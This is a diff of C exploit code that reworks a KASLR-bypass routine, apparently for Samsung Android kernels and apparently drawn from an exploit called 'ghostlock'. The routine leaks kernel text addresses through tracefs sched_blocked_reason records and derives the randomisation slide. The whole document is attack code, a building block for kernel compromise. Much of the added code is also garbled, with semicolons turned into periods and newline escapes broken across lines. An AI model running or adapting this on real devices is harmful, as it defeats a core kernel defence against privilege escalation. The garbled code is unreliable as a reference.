@@ -1288,7 +1288,19 @@ fail:
  * Used as fallback when timer-based calib_a produces weak/implausible slide,
  * and also to cross-check weak slides.
  */
+/*
+ * tracefs KASLR slide leak (ghostlock-s26 targeted + kallsyms fallback).
+ *
+ * Primary (ghostlock-s26 targeted): uses profile's tracefs_worker_caller_off
+ * (return PC after `bl schedule` in `worker_thread`). Matches trace
+ * records against this specific return address. Most precise.
+ *
+ * Fallback: if tracefs_worker_caller_off is missing from profile, collect
+ * all caller PCs from trace records, resolve each against kallsyms, and
+ * find the most common (caller_pc - symbol_va) difference.
+ */
 static int calib_a_tracefs_slide_leak(const struct kernel_offsets *o,
+				      sr_sym *syms, size_t nsyms,
 				      uint64_t *out_slide)
 {
 	static const char tracing_on[] = TRACE "/tracing_on";
@@ -1301,135 +1313,281 @@ static int calib_a_tracefs_slide_leak(const struct kernel_offsets *o,
 	int found = 0;
 	int attempt, cpu, ncpu;
 
-	/* Need tracefs_worker_caller_off from profile */
-	if (!o->tracefs_worker_caller_off) {
-		fprintf(stdout, "[calib_a] tracefs: profile missing tracefs_worker_caller_off\n");
-		return 0;
-	}
-	uint64_t link_caller = KIMAGE_TEXT_BASE + o->tracefs_worker_caller_off;
+	/* Try ghostlock-s26 targeted approach first if profile has the offset */
+	if (o->tracefs_worker_caller_off) {
+		uint64_t link_caller = KIMAGE_TEXT_BASE + o->tracefs_worker_caller_off;
 
-	/* event_id: use profile's tracefs_event_id if available, else read from fs */
-	uint16_t tracefs_event_id = (uint16_t)o->tracefs_event_id;
-	if (tracefs_event_id == 0) {
-		static const char event_id_path[] = TRACE "/events/sched/sched_blocked_reason/id";
-		char event_id_buf[32];
-		fd = open(event_id_path, O_RDONLY | O_CLOEXEC);
-		if (fd >= 0) {
-			ssize_t r = read(fd, event_id_buf, sizeof(event_id_buf) - 1);
-			close(fd);
-			if (r > 0) {
-				event_id_buf[r] = 0;
-				tracefs_event_id = (uint16_t)atoi(event_id_buf);
+		/* event_id: use profile's tracefs_event_id if available, else read from fs */
+		uint16_t tracefs_event_id = (uint16_t)o->tracefs_event_id;
+		if (tracefs_event_id == 0) {
+			static const char event_id_path[] = TRACE "/events/sched/sched_blocked_reason/id";
+			char event_id_buf[32];
+			fd = open(event_id_path, O_RDONLY | O_CLOEXEC);
+			if (fd >= 0) {
+				ssize_t r = read(fd, event_id_buf, sizeof(event_id_buf) - 1);
+				close(fd);
+				if (r > 0) {
+					event_id_buf[r] = 0;
+					tracefs_event_id = (uint16_t)atoi(event_id_buf);
+				}
+			}
+		}
+		if (tracefs_event_id == 0) tracefs_event_id = 110; /* Samsung GKI */
+
+		fprintf(stdout, "[calib_a] tracefs: targeted mode link_caller=0x%llx event_id=%u
+",
+			(unsigned long long)link_caller, tracefs_event_id);
+
+		/* Disable kmem events, enable sched_blocked_reason */
+		write_file(TRACE "/events/kmem/rss_stat/enable", "0
+");
+		trigger_cmd("!enable_event:kmem:kmem_cache_alloc
+");
+		write_file(TRACE "/tracing_on", "0
+");
+		if (write_file(event_enable, "1
+")) {
+			fprintf(stdout, "[calib_a] tracefs: sched_blocked_reason not available
+");
+		} else {
+			truncate_file(TRACE "/trace");
+			write_file(tracing_on, "1
+");
+			sleep(2);
+			write_file(TRACE "/tracing_on", "0
+");
+			write_file(event_enable, "0
+");
+
+			/* Scan trace records for the specific worker_thread caller */
+			ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
+			if (ncpu > 16) ncpu = 16.
+
+			for (attempt = 0; attempt < 5 && !found; attempt++) {
+				for (cpu = 0; cpu < ncpu && !found; cpu++) {
+					snprintf(path, sizeof(path),
+						 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+					fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC).
+					if (fd < 0) continue.
+					while ((got = read(fd, page, sizeof(page))) > 0) {
+						if (got < 20) continue.
+						uint64_t commit = 0.
+						memcpy(&commit, page + 8, sizeof(commit)).
+						size_t data_len = (size_t)(commit & 0xfffULL).
+						size_t end = 16 + data_len.
+						if (end > (size_t)got) end = (size_t)got.
+
+						size_t pos = 16.
+						while (pos + 4 <= end) {
+							uint32_t eh = 0.
+							memcpy(&eh, page + pos, sizeof(eh)).
+							uint32_t type_len = eh & 0x1fU.
+							if (type_len == 30) { pos += 8; continue; }
+							if (type_len == 31) { pos += 12; continue; }
+							if (type_len == 0 || type_len >= 29) break.
+
+							size_t rec_len = (size_t)type_len * 4.
+							size_t rec = pos + 4.
+							if (rec + rec_len > end) break.
+
+							uint16_t eid = 0.
+							memcpy(&eid, page + rec, sizeof(eid)).
+							if (eid != tracefs_event_id) {
+								pos = rec + rec_len; continue.
+							}
+
+							if (rec_len >= 24) {
+								uint64_t caller = 0.
+								memcpy(&caller, page + rec + 16, sizeof(caller)).
+								if ((caller >> 48) == 0xffff &&
+								    (caller & 3) == 0 &&
+								    caller >= link_caller) {
+									uint64_t slide = caller - link_caller.
+									if (slide < (1ULL << 42) &&
+									    (slide & (SR_SLIDE_ALIGN - 1)) == 0) {
+										candidate_slide = slide.
+										found = 1.
+										fprintf(stdout,
+											"[calib_a] tracefs: targeted hit caller=0x%016llx slide=0x%08llx
+",
+											(unsigned long long)caller,
+											(unsigned long long)slide).
+										break.
+									}
+								}
+							}
+							pos = rec + rec_len.
+						}
+					}
+					close(fd).
+				}
+				if (found) break.
+				if (!found && attempt < 4) sleep(1).
+			}
+			if (found) {
+				fprintf(stdout, "[calib_a] tracefs: targeted slide=%#llx
+",
+					(unsigned long long)candidate_slide).
+				*out_slide = candidate_slide.
+				return 1.
 			}
 		}
 	}
+
+	/* Fallback: kallsyms-based mode - collect all caller PCs and find most common slide */
+	fprintf(stdout, "[calib_a] tracefs: fallback kallsyms mode (syms=%zu)
+", nsyms).
+	if (!syms || nsyms == 0) {
+		fprintf(stdout, "[calib_a] tracefs: no kallsyms map for fallback
+").
+		return 0.
+	}
+
+	/* event_id for fallback: try profile, then fs, then default 110 */
+	uint16_t tracefs_event_id = (uint16_t)o->tracefs_event_id.
 	if (tracefs_event_id == 0) {
-		/* Fallback: Samsung GKI typically uses 110 */
-		tracefs_event_id = 110;
+		static const char event_id_path[] = TRACE "/events/sched/sched_blocked_reason/id".
+		char event_id_buf[32].
+		fd = open(event_id_path, O_RDONLY | O_CLOEXEC).
+		if (fd >= 0) {
+			ssize_t r = read(fd, event_id_buf, sizeof(event_id_buf) - 1).
+			close(fd).
+			if (r > 0) {
+				event_id_buf[r] = 0.
+				tracefs_event_id = (uint16_t)atoi(event_id_buf).
+			}
+		}
 	}
-	fprintf(stdout, "[calib_a] tracefs: using event_id=%u link_caller=0x%llx\n",
-		tracefs_event_id, (unsigned long long)link_caller);
+	if (tracefs_event_id == 0) tracefs_event_id = 110.
 
-	/* Disable kmem events to reduce noise */
-	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
-	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
-	write_file(TRACE "/tracing_on", "0\n");
-
-	/* Enable sched_blocked_reason */
-	if (write_file(event_enable, "1\n")) {
-		fprintf(stdout, "[calib_a] tracefs: sched_blocked_reason not available\n");
-		return 0;
+	/* Disable kmem, enable sched_blocked_reason */
+	write_file(TRACE "/events/kmem/rss_stat/enable", "0
+").
+	trigger_cmd("!enable_event:kmem:kmem_cache_alloc
+").
+	write_file(TRACE "/tracing_on", "0
+").
+	if (write_file(event_enable, "1
+")) {
+		fprintf(stdout, "[calib_a] tracefs: sched_blocked_reason not available
+").
+		return 0.
 	}
 
-	/* Start tracing and wait for events */
-	truncate_file(TRACE "/trace");
-	write_file(tracing_on, "1\n");
-	sleep(2);
-	write_file(tracing_on, "0\n");
-	write_file(event_enable, "0\n");
+	truncate_file(TRACE "/trace").
+	write_file(tracing_on, "1
+").
+	sleep(2).
+	write_file(TRACE "/tracing_on", "0
+").
+	write_file(event_enable, "0
+").
 
-	/* Read trace_pipe_raw from all CPUs */
-	ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
-	if (ncpu > 16) ncpu = 16;
+	/* Collect all caller PCs from trace, resolve against kallsyms */
+	ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN).
+	if (ncpu > 16) ncpu = 16.
 
-	/* Retry up to 5 times (ghostlock does 5 attempts) */
-	for (attempt = 0; attempt < 5 && !found; attempt++) {
-		for (cpu = 0; cpu < ncpu && !found; cpu++) {
+	/* slide value -> count */
+	static uint64_t slide_vals[256].
+	static int slide_cnts[256].
+	int n_slides = 0.
+	int best_count = 0.
+	uint64_t best_slide = 0.
+	int total_found = 0.
+
+	for (attempt = 0; attempt < 3; attempt++) {
+		for (cpu = 0; cpu < ncpu; cpu++) {
 			snprintf(path, sizeof(path),
-				 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
-			fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
-			if (fd < 0)
-				continue;
+				 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu).
+			fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC).
+			if (fd < 0) continue.
 			while ((got = read(fd, page, sizeof(page))) > 0) {
-				if (got < 20) continue;
-				uint64_t commit = 0;
-				memcpy(&commit, page + 8, sizeof(commit));
-				size_t data_len = (size_t)(commit & 0xfffULL);
-				size_t end = 16 + data_len;
-				if (end > (size_t)got) end = (size_t)got;
+				if (got < 20) continue.
+				uint64_t commit = 0.
+				memcpy(&commit, page + 8, sizeof(commit)).
+				size_t data_len = (size_t)(commit & 0xfffULL).
+				size_t end = 16 + data_len.
+				if (end > (size_t)got) end = (size_t)got.
 
-				size_t pos = 16;
+				size_t pos = 16.
 				while (pos + 4 <= end) {
-					uint32_t eh = 0;
-					memcpy(&eh, page + pos, sizeof(eh));
-					uint32_t type_len = eh & 0x1fU;
+					uint32_t eh = 0.
+					memcpy(&eh, page + pos, sizeof(eh)).
+					uint32_t type_len = eh & 0x1fU.
 					if (type_len == 30) { pos += 8; continue; }
 					if (type_len == 31) { pos += 12; continue; }
-					if (type_len == 0 || type_len >= 29) break;
+					if (type_len == 0 || type_len >= 29) break.
 
-					size_t rec_len = (size_t)type_len * 4;
-					size_t rec = pos + 4;
-					if (rec + rec_len > end) break;
+					size_t rec_len = (size_t)type_len * 4.
+					size_t rec = pos + 4.
+					if (rec + rec_len > end) break.
 
-					uint16_t eid = 0;
-					memcpy(&eid, page + rec, sizeof(eid));
-					if (eid != tracefs_event_id) {
-						pos = rec + rec_len;
-						continue;
+					uint16_t eid = 0.
+					memcpy(&eid, page + rec, sizeof(eid)).
+					if (tracefs_event_id && eid != tracefs_event_id) {
+						pos = rec + rec_len; continue.
 					}
 
-					/* Caller PC is at record + 16 (ghostlock slide.c) */
 					if (rec_len >= 24) {
-						uint64_t caller = 0;
-						memcpy(&caller, page + rec + 16, sizeof(caller));
-						/* Must be a kernel text address, 2MiB-aligned candidate */
-						if ((caller >> 48) == 0xffff &&
-						    (caller & 3) == 0 &&
-						    caller >= link_caller) {
-							uint64_t slide = caller - link_caller;
-							if (slide < (1ULL << 42) &&
-							    (slide & (SR_SLIDE_ALIGN - 1)) == 0) {
-								candidate_slide = slide;
-								found = 1;
-								fprintf(stdout,
-									"[calib_a] tracefs: discovered worker caller: caller=0x%016llx, candidate=0x%08llx\n",
-									(unsigned long long)caller,
-									(unsigned long long)slide);
-								break;
+						uint64_t caller = 0.
+						memcpy(&caller, page + rec + 16, sizeof(caller)).
+						if ((caller >> 48) == 0xffff && (caller & 3) == 0) {
+							uint64_t func_base, func_len.
+							if (sr_find_func(syms, nsyms, caller,
+								 &func_base, &func_len, NULL)) {
+								uint64_t slide = caller - func_base.
+								if (slide < (1ULL << 42) &&
+								    slide < func_len + (1U << 21)) {
+									/* Add to count */
+									int j, dup = 0.
+									for (j = 0; j < n_slides; j++) {
+										if (slide_vals[j] == slide) {
+											slide_cnts[j]++.
+											dup = 1; break.
+										}
+									}
+									if (!dup && n_slides < 256) {
+										slide_vals[n_slides] = slide.
+										slide_cnts[n_slides] = 1.
+										n_slides++.
+									}
+									total_found++.
+								}
 							}
 						}
 					}
-					pos = rec + rec_len;
+					pos = rec + rec_len.
 				}
 			}
-			close(fd);
+			close(fd).
 		}
-		if (found) break;
-		if (!found && attempt < 4)
-			sleep(1);
 	}
 
-	if (!found) {
-		fprintf(stdout, "[calib_a] tracefs: no valid caller found after %d attempts\n", attempt + 1);
-		return 0;
+	if (total_found == 0) {
+		fprintf(stdout, "[calib_a] tracefs: no valid caller PCs resolved
+").
+		return 0.
 	}
 
-	fprintf(stdout, "[calib_a] tracefs: slide=%#llx (verified 2MiB aligned)\n",
-		(unsigned long long)candidate_slide);
-	*out_slide = candidate_slide;
-	return 1;
+	/* Find most common slide */
+	for (int i = 0; i < n_slides; i++) {
+		if (slide_cnts[i] > best_count) {
+			best_count = slide_cnts[i].
+			best_slide = slide_vals[i].
+		}
+	}
+
+	if (best_count < 2) {
+		fprintf(stdout, "[calib_a] tracefs: fallback weak (count=%d)
+", best_count).
+	}
+
+	fprintf(stdout, "[calib_a] tracefs: fallback slide=%#llx (count=%d, candidates=%d)
+",
+		(unsigned long long)best_slide, best_count, n_slides).
+	*out_slide = best_slide.
+	return 1.
 }
-
 int calib_a_main(int argc, char **argv)
 {
 	const struct kernel_offsets *o = kernel_table_get();
